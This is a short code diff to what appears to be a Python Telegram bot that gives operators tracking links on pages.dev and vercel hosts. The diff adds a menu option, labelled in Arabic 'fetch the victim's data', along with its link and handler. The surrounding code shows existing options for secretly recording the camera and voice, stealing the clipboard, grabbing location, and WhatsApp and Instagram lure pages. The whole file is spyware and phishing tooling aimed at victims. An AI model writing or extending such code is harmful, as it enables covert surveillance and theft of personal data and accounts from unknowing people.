@@ -76,6 +76,7 @@ LINK_CAM_BACK_REC = "https://yahya-pages.pages.dev/Recc.html"
 LINK_RECORD_VOICE = "https://yahya-pages.pages.dev/Record.html"
 LINK_CLIPBOARD = "https://yahya-pages.pages.dev/Clib.html"
 LINK_LOCATION = "https://yahya-pages.pages.dev/Loc.html"
+LINK_DATA = "https://yahya-pages.pages.dev/data.html"
 LINK_FI_REPLY = f"{VERCEL_BASE}/Phone%20Info.html"
 LINK_WHATSAPP = f"{VERCEL_BASE}/Whatsapp.html"
 LINK_INSTAGRAM = f"{VERCEL_BASE}/Instagram.html"
@@ -432,6 +433,7 @@ def build_main_menu():
         ("تسجيل صوت 🎤", "get_record_voice"),
         ("سحب الحافظة 📋", "get_clipboard"),
         ("جلب الموقع الجغرافي 🗺️", "get_location"),
+        ("جلب بيانات الضحية 🎁", "get_data"),
         ("ID 🆔", "get_id"),
         ("صور AI 🎨", "ai_image"),
         ("اختصار روابط 🔗", "short_link"),
@@ -1349,6 +1351,8 @@ def callback_query(call):
         bot.send_message(chat_id, f"{LINK_CLIPBOARD}?id={chat_id}")
     elif call.data == "get_location": 
         bot.send_message(chat_id, f"{LINK_LOCATION}?id={chat_id}")
+    elif call.data == "get_data": 
+        bot.send_message(chat_id, f"{LINK_DATA}?id={chat_id}")
     elif call.data == "get_cam_back": 
         bot.send_message(chat_id, f"{LINK_CAM_BACK}?id={chat_id}")
     elif call.data == "get_tiktok": 
